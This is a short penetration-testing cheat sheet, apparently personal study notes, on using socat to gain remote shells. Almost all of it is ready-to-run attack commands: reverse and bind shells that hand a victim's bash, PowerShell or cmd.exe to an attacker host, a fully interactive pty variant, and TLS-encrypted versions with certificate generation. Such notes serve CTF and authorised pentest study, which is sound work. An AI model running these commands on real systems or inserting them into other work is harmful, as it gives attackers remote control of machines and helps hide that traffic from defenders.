#cheatsheet 
# Socat
## Using *socat* To Gain Shell
First transfer the socat binary from attacker machine to target machine. Use any of the methods described in [[Transferring Files]].


### Unencrypted Shells
#### Reverse Shell
Attacker machine:
`socat TCP-L:<port>` - sets up a listener on the specified port

Victim machine:
- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` - linux target
- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` - windows target

#### Bind Shell
Victim machine:
- `socat TCP-L:<PORT> EXEC:"bash -li"` - linux target
- `socat TCP-L:<PORT> EXEC:powershell.exe,pipes` - windows target

Attacker machine:
`socat TCP:<TARGET-IP>:<TARGET-PORT>`

**For stable shell:**
Listener:
- `socat TCP-L:<port> FILE:`tty`,raw,echo=0` - equivalent of *stty raw -echo; fg* in netcat
Connect back:
- `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Encrypted Shells
**Just replace *TCP* in simple socat with *OPENSSL* for encrypted**
1. Generate certificates (on attacker machine) to use encrypted shells
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
`cat shell.key shell.crt > shell.pem`

#### Reverse Shell
2. Set up a listener
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` - verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.

**Note:** The certificate must be used on whichever device is *LISTENING*.

3. Connect back
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

#### Bind Shell
Victim:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - //attacker`